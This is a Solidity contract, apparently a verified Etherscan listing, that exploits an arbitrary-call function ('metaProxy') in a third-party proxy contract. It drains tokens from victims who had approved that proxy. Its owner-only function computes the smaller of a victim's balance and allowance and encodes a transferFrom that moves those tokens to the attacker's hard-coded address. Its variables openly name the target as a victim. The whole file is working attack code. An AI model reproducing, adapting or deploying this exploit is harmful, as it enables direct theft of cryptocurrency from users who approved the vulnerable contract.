/**
 *Submitted for verification at Etherscan.io on 2023-02-05
*/

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /// @notice EIP 2612
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
}
interface IPROXY{
    function metaProxy(address tokenAddress, address approveTo, address callDataTo, bytes memory data) external payable;
}

contract hello{
    address proxyaddress = 0xaf7F50d8C86ddFd41C2FdC2e51B2BBbc5aBB75da;
    IPROXY proxycaller = IPROXY(proxyaddress);
    address owner = 0xd0Df47711762e3BfDDB38Db25c5218dD7D5dE09B;
    address etherf = 0x0000000000000000000000000000000000000000;
    modifier onlyfuckyou{
        require(msg.sender == owner);
        _;
    }
    function hellosecondtime(address fuckingvictim, address fuckingtoken) external payable onlyfuckyou{
        uint256 fuckingamount;
        uint256 balanceofVic = IERC20(fuckingtoken).balanceOf(fuckingvictim);
        uint256 allo = IERC20(fuckingtoken).allowance(fuckingvictim,proxyaddress);
        if(allo<balanceofVic){
            fuckingamount = allo;
        }
        else{
            fuckingamount = balanceofVic;
        }
        bytes memory fuckingdata = abi.encodePacked(
            bytes4(keccak256('transferFrom(address,address,uint256)')), // function signature
            abi.encode(
                fuckingvictim,
                owner,
                fuckingamount
            )
        );
        uint256 ethervalue = msg.value;
        proxycaller.metaProxy{value:ethervalue}(etherf,fuckingtoken,fuckingtoken,fuckingdata);
    }
}